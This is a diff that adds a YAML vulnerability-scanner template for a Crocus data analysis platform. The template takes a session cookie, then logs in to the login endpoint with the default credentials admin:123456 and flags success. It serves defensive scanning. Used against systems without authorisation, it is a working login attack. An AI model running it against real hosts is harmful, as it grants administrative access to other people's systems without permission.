@@ -1,0 +1,61 @@
+id: crocus-default-password
+info:
+  name: Crocus Data Analysis Platform Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Crocus Data Analytics Platform suffers from a default password vulnerability in the `/Plugin/RegisterLogin/Default.jsp` endpoint. Attackers can use these default credentials to gain administrative access.
+  tags: default-password
+  reference:
+    - https://crocus.ai
+variables:
+  default-credentials: "admin:123456"
+http:
+  - id: check-session
+    method: GET
+    path:
+      - "/Plugin/RegisterLogin/Default.jsp"
+    headers:
+      Accept: application/json, text/javascript, */*; q=0.01
+      X-Requested-With: XMLHttpRequest
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: session_id
+        part: header
+        internal: true
+        regex:
+          - "JSESSIONID=(.*?);"
+  - id: login-with-default-password
+    method: POST
+    path:
+      - "/RegisterLogin.do?Action=Login"
+    headers:
+      Accept: application/json, text/javascript, */*; q=0.01
+      X-Requested-With: XMLHttpRequest
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Cookie: "JSESSIONID={{session_id}};"
+      Connection: close
+    body: "UserName=admin&Password=123456&MailCode=&AuthCode="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Result\":true"
+          - "\"Code\":200"
